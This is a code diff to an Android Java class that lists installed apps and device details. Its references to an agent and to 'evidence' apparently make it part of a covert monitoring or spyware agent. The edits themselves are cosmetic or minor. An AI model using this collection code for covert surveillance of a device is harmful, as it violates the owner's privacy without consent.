@@ -139,7 +139,6 @@ public class ModuleDevice extends BaseInstantModule {
 		}
 
 		if (processList) {
-
 			final ArrayList<PInfo> apps = getInstalledApps(false); /*
 																	 * false =
 																	 * no system
@@ -149,7 +148,6 @@ public class ModuleDevice extends BaseInstantModule {
 
 			for (int i = 0; i < max; i++) {
 				sb.append(apps.get(i) + "\n"); //$NON-NLS-1$
-
 			}
 		}
 
@@ -170,7 +168,6 @@ public class ModuleDevice extends BaseInstantModule {
 		// final Evidence evidence = new Evidence(Agent.AGENT_DEVICE);
 		// evidence.atomicWriteOnce(null, EvidenceType.DEVICE,
 		// WChar.getBytes(content, true));
-
 	}
 
 	/**
@@ -193,6 +190,10 @@ public class ModuleDevice extends BaseInstantModule {
 			this.cpuTotal = currTotal;
 			this.cpuIdle = currIdle;
 		} catch (final IOException ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(ex);//$NON-NLS-1$
 			}
@@ -203,7 +204,6 @@ public class ModuleDevice extends BaseInstantModule {
 	 * The Class PInfo.
 	 */
 	class PInfo {
-
 		/** The appname. */
 		private String appname = ""; //$NON-NLS-1$
 
@@ -216,9 +216,6 @@ public class ModuleDevice extends BaseInstantModule {
 		/** The version code. */
 		private int versionCode = 0;
 
-		/** The icon. */
-		private Drawable icon;
-
 		/*
 		 * (non-Javadoc)
 		 * 
@@ -228,7 +225,6 @@ public class ModuleDevice extends BaseInstantModule {
 		public String toString() {
 			return appname + "\t" + pname + "\t" + versionName + "\t" + versionCode; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 		}
-
 	}
 
 	/**
@@ -243,11 +239,13 @@ public class ModuleDevice extends BaseInstantModule {
 																 * packages
 																 */
 		final int max = apps.size();
+
 		for (int i = 0; i < max; i++) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: " + apps.get(i).toString());//$NON-NLS-1$
 			}
 		}
+
 		return apps;
 	}
 
@@ -263,19 +261,23 @@ public class ModuleDevice extends BaseInstantModule {
 		final PackageManager packageManager = Status.getAppContext().getPackageManager();
 
 		final List<PackageInfo> packs = packageManager.getInstalledPackages(0);
+
 		for (int i = 0; i < packs.size(); i++) {
 			final PackageInfo p = packs.get(i);
+
 			if ((!getSysPackages) && (p.versionName == null)) {
 				continue;
 			}
+
 			final PInfo newInfo = new PInfo();
+
 			newInfo.appname = p.applicationInfo.loadLabel(packageManager).toString();
 			newInfo.pname = p.packageName;
 			newInfo.versionName = p.versionName;
 			newInfo.versionCode = p.versionCode;
-			newInfo.icon = p.applicationInfo.loadIcon(packageManager);
 			res.add(newInfo);
 		}
+
 		return res;
 	}
 }
